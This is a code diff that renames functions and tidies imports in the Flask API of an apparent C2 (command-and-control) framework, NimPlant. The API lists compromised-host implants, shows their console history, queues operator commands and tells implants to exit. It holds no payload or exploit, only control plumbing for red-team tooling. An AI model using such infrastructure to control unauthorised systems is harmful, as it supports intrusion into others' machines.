@@ -1,16 +1,24 @@
-from ..util.commands import getCommands, handleCommand
-from ..util.config import config
-from ..util.crypto import randString
-from ..util.func import exitServer
-from ..util.nimplant import np_server
+import os
+from threading import Thread
 
+import flask
 from flask_cors import CORS
 from gevent.pywsgi import WSGIServer
-from server.util.db import *
-from threading import Thread
 from werkzeug.utils import secure_filename
-import flask
-import os
+
+from server.util.commands import get_commands, handle_command
+from server.util.config import config
+from server.util.crypto import randString
+from server.util.func import exit_server
+from server.util.nimplant import np_server
+from server.util.db import (
+    db_get_nimplant_console,
+    db_get_nimplant_details,
+    db_get_nimplant_info,
+    db_get_server_console,
+    db_get_server_info,
+)
+
 
 # Parse server configuration
 server_ip = config["server"]["ip"]
@@ -25,12 +33,13 @@ app = flask.Flask(
 )
 app.secret_key = randString(32)
 
+
 # Define the API server
 def api_server():
     # Get available commands
     @app.route("/api/commands", methods=["GET"])
-    def get_commands():
-        return flask.jsonify(getCommands()), 200
+    def get_command_list():
+        return flask.jsonify(get_commands()), 200
 
     # Get download information
     @app.route("/api/downloads", methods=["GET"])
@@ -74,7 +83,7 @@ def api_server():
     # Get server configuration
     @app.route("/api/server", methods=["GET"])
     def get_server_info():
-        return flask.jsonify(dbGetServerInfo(np_server.guid)), 200
+        return flask.jsonify(db_get_server_info(np_server.guid)), 200
 
     # Get the last X lines of console history
     @app.route("/api/server/console", methods=["GET"])
@@ -85,12 +94,12 @@ def api_server():
         if not lines.isnumeric() or not offset.isnumeric():
             return flask.jsonify("Invalid parameters"), 400
 
-        return flask.jsonify(dbGetServerConsole(np_server.guid, lines, offset)), 200
+        return flask.jsonify(db_get_server_console(np_server.guid, lines, offset)), 200
 
     # Exit the server
     @app.route("/api/server/exit", methods=["POST"])
     def post_exit_server():
-        Thread(target=exitServer).start()
+        Thread(target=exit_server).start()
         return flask.jsonify("Exiting server..."), 200
 
     # Upload a file to the server's "uploads" folder
@@ -117,13 +126,13 @@ def api_server():
     # Get all active nimplants with basic information
     @app.route("/api/nimplants", methods=["GET"])
     def get_nimplants():
-        return flask.jsonify(dbGetNimplantInfo(np_server.guid)), 200
+        return flask.jsonify(db_get_nimplant_info(np_server.guid)), 200
 
     # Get a specific nimplant with its details
     @app.route("/api/nimplants/<guid>", methods=["GET"])
     def get_nimplant(guid):
-        if np_server.getNimplantByGuid(guid):
-            return flask.jsonify(dbGetNimplantDetails(guid)), 200
+        if np_server.get_nimplant_by_guid(guid):
+            return flask.jsonify(db_get_nimplant_details(guid)), 200
         else:
             return flask.jsonify("Invalid Nimplant GUID"), 404
 
@@ -136,20 +145,20 @@ def api_server():
         if not lines.isnumeric() or not offset.isnumeric():
             return flask.jsonify("Invalid parameters"), 400
 
-        if np_server.getNimplantByGuid(guid):
-            return flask.jsonify(dbGetNimplantConsole(guid, lines, offset)), 200
+        if np_server.get_nimplant_by_guid(guid):
+            return flask.jsonify(db_get_nimplant_console(guid, lines, offset)), 200
         else:
             return flask.jsonify("Invalid Nimplant GUID"), 404
 
     # Issue a command to a specific nimplant
     @app.route("/api/nimplants/<guid>/command", methods=["POST"])
     def post_nimplant_command(guid):
-        np = np_server.getNimplantByGuid(guid)
+        np = np_server.get_nimplant_by_guid(guid)
         data = flask.request.json
         command = data["command"]
 
         if np and command:
-            handleCommand(command, np)
+            handle_command(command, np)
             return flask.jsonify(f"Command queued: {command}"), 200
         else:
             return flask.jsonify("Invalid Nimplant GUID or command"), 404
@@ -157,10 +166,10 @@ def api_server():
     # Exit a specific nimplant
     @app.route("/api/nimplants/<guid>/exit", methods=["POST"])
     def post_nimplant_exit(guid):
-        np = np_server.getNimplantByGuid(guid)
+        np = np_server.get_nimplant_by_guid(guid)
 
         if np:
-            handleCommand("kill", np)
+            handle_command("kill", np)
             return flask.jsonify("Instructed Nimplant to exit"), 200
         else:
             return flask.jsonify("Invalid Nimplant GUID"), 404
